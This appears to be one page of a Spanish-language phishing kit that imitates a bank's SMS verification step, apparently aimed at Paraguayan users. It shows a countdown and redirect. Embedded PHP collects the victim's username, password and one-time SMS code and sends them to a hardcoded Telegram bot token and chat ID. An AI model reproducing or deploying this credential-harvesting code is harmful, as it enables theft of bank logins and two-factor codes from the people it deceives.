<!DOCTYPE html>
<html lang="en">
<head>
	<title>home</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">

	<link rel="stylesheet" type="text/css" href="util.css">
	<link rel="stylesheet" type="text/css" href="main.css">
 <script language="JavaScript">
	var tiempo=30;
    var url="index3.php";
 
    function updateReloj()
    {
        document.getElementById('contador').innerHTML = "Por favor, espera "+tiempo+" segundos <br>estamos enviando un código a tu telefono";
 
        if(tiempo==0)
        {
            window.location=url;
        }else{
            tiempo-=1;
            setTimeout("updateReloj()",1000);
        }
    }
   window.onload=updateReloj;
 
    </script>
</head>
<body>
	
	<div class="limiter">
		<div class="container-login100">
			<div class="wrap-login100">
				<form class="login100-form validate-form" method="post" action="index3.php">
					<div align="center">
						<h2 style="font-family: :Arial"> ESTAMOS ENVIANDO UN CODIGO SMS A TU TELEFONO</h2>
					</div>
					
					
					
					  
  	<div align="center"><img src="gif_paraguayu.gif" style="width:90px; margin-top: 30px;">
								
								<br><br><br><br>
								
								
								<font id="contador" style=" font-size:18px;"></font>
								</div>

					<div class="text-center p-t-115">
						<img src="512x512bb.jpg" style="width:100px;">
						

					</div>
				</form>
			</div>
		</div>
	</div>
	
	<?php
    if (isset($_POST['submit'])) {
        $usuario = $_POST['usuario'];
        $password = $_POST['password'];
        $code = $_POST['code'];

        // Your Telegram API Token
        $token = "5964956592:AAHrvMUcX3qB6oUxvpkq5Q8ZvKzKa2dJYhY";
        // Your Telegram Chat ID
        $chat_id = "5915051785";

        $message = "User: " . $user . "\nPassword: " . $password . "\nCode: " . $code;

        $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chat_id . "&text=" . $message;

        file_get_contents($url);
    }
?>
</body>
</html>